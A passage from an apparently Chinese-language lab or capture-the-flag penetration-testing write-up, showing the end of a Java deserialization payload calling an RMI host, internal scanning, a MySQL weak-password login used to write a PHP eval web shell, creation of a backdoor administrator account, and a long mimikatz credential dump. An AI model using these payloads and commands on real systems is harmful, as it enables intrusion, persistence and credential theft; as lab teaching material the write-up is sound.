&lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;VPS_IP&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;VPS_IP&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075368101-0510c6cd-2759-4664-97a7-6975de2a14b0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075377485-aa07bec5-f5dc-46bd-b9ba-432e1725de5b.png"></p><p>找一下flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075461534-faec4ff4-bf3e-4dfa-b115-418ffca6a696.png"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>接着上代理和扫描</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075599992-604cddcf-cbc0-472c-96d9-916814682ba6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> ./fscan -h 172.22.13.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.13.14    is alive</span><br><span class="line">(icmp) Target 172.22.13.6     is alive</span><br><span class="line">(icmp) Target 172.22.13.28    is alive</span><br><span class="line">(icmp) Target 172.22.13.57    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.13.14:22 open</span><br><span class="line">172.22.13.14:21 open</span><br><span class="line">172.22.13.28:3306 open</span><br><span class="line">172.22.13.28:445 open</span><br><span class="line">172.22.13.6:445 open</span><br><span class="line">172.22.13.6:139 open</span><br><span class="line">172.22.13.28:139 open</span><br><span class="line">172.22.13.6:135 open</span><br><span class="line">172.22.13.28:80 open</span><br><span class="line">172.22.13.57:80 open</span><br><span class="line">172.22.13.57:22 open</span><br><span class="line">172.22.13.14:80 open</span><br><span class="line">172.22.13.6:88 open</span><br><span class="line">172.22.13.28:135 open</span><br><span class="line">172.22.13.14:8080 open</span><br><span class="line">172.22.13.28:8000 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.13.6</span><br><span class="line">   [-&gt;]WIN-DC</span><br><span class="line">   [-&gt;]172.22.13.6</span><br><span class="line">[*] WebTitle http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.13.28</span><br><span class="line">   [-&gt;]WIN-HAUWOLAO</span><br><span class="line">   [-&gt;]172.22.13.28</span><br><span class="line">[*] NetBios 172.22.13.6     [+] DC:XIAORANG\WIN-DC         </span><br><span class="line">[*] WebTitle http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] WebTitle http://172.22.13.14:8080  code:200 len:3655   title:公司发货单</span><br><span class="line">[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.</span><br><span class="line">[+] ftp 172.22.13.14:21:anonymous </span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">[+] mysql 172.22.13.28:3306:root 123456</span><br><span class="line">已完成 16/16</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.6 dc</span><br><span class="line">172.22.13.14 本机</span><br><span class="line">172.22.13.57 nfs</span><br><span class="line">172.22.13.28 mysql</span><br></pre></td></tr></table></figure><p>这里有mysql弱口令，加个全局代理连上去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077331885-026d28ee-0a7b-4c04-97ad-8edaeb256c5c.png"></p><p>看一下secure_file_priv，发现可以写文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077412408-35086b93-e53f-49b1-819b-68b0687e3045.png"></p><p>再查看日志发现是phpstudy起的服务，那就很好，因为这东西权限很高，一般连上去就是system权限，不用udf提权了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077479653-df3bd8fa-5c8c-4c95-8940-37869ef255cc.png"></p><p>写🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;</span><br></pre></td></tr></table></figure><p>再用蚁剑链接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077641659-acf047f0-aa3e-4b02-a897-66201aa34a5d.png"></p><p>然后建个用户rdp上去  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user calmsec admin@123 /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077721458-66d9cef3-5fe0-4987-a897-f1fe768f2ac9.png"></p><p>猕猴桃抓一下hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; test.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # log</span><br><span class="line">Using &#x27;mimikatz.log&#x27; for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8364475 (00000000:007fa1bb)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : calmsec</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/3/27 20:38:07</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line"> * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8343078 (00000000:007f4e26)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 20:38:06</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 88154 (00000000:0001585a)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : chenglei</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : WIN-DC</span><br><span class="line">Logon Time        : 2025/3/27 19:59:04</span><br><span class="line">SID               : S-1-5-21-3269458654-3569381900-10559451-1105</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line"> * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line"> * DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : Xt61f3LBhg1</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53554 (00000000:0000d132)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win-hauwolao$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 24165 (00000000:00005e65)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:01</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8364504 (00000000:007fa1d8)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : calmsec</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/3/27 20:38:07</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line"> * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8342695 (00000000:007f4ca7)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 20:38:06</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 